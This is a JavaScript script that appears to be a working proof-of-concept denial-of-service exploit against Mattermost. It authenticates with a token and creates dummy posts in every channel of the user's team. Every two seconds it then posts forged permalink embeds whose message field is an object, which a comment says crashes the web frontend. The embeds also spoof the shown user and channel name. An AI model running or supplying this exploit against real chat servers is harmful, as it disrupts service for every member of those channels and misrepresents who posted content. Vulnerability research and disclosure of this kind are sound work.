const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;

const teamResp = await fetch(`${MM_INSTANCE_URL}/api/v4/users/me/teams`, {
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${MM_AUTH_TOKEN}`,
  },
});

const team = (await teamResp.json())[0];

const channelsResp = await fetch(
  `${MM_INSTANCE_URL}/api/v4/users/me/teams/${team?.id}/channels`,
  {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${MM_AUTH_TOKEN}`,
    },
  },
);

const channels = await channelsResp.json();

const createDummyPost = async (channel_id, message = "dummy") => {
  const body = JSON.stringify({
    message,
    channel_id,
  });
  const resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${MM_AUTH_TOKEN}`,
    },
    method: "POST",
    body,
  });
  return await resp.json();
};

let posts = [];
for await (const channel of channels) {
  // create dummy posts for us to link ; this could also be already existing posts
  posts.push(await createDummyPost(channel.id));
}

const sendDoSPost = async (channel_id, post_id, shown_user_id) => {
  const metadata = {
    embeds: [
      {
        type: "permalink",
        data: {
          post_id,
          post: {
            id: post_id,
            user_id: shown_user_id,
            channel_id: "doesnt-matter",
            root_id: "",
            original_id: "",
            message: {}, // will cause DoS of frontend because it expects a string
            type: "",
            props: {},
            hashtags: "",
            reply_count: 0,
            last_reply_at: 0,
            participants: [],
            metadata: {},
          },
          team_name: "",
          channel_display_name: "can-be-anything-i-want",
          channel_type: "O",
          channel_id: "",
        },
      },
    ],
  };
  const body = JSON.stringify({
    file_ids: [],
    message: "",
    props: {
      previewed_post: post_id,
    },
    channel_id,
    metadata,
  });

  const resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${MM_AUTH_TOKEN}`,
    },
    method: "POST",
    body,
  });

  return await resp.json();
};

const sendDoSPosts = async () => {
  for await (const post of posts) {
    const resp = await sendDoSPost(post.channel_id, post.id, post.user_id);
    console.log(resp);
  }
};

setInterval(sendDoSPosts, 2000);

await new Promise(() => {});
